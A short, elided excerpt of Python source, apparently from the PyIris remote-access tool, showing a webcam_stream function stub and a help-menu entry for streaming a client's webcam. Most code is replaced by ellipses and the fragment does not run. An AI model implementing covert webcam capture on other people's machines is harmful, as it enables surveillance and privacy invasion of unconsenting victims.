...
def webcam_stream(sock, data):
    ...
    while True:
        ...
        self.config.help_menu['webcam_stream <camera index>'] = 'Stream clients webcam to PyIris. Camera index is optional, by default it will be zero. In some instances it may need to be provided due to the 0 index being unavailable'
    elif option == 'info':
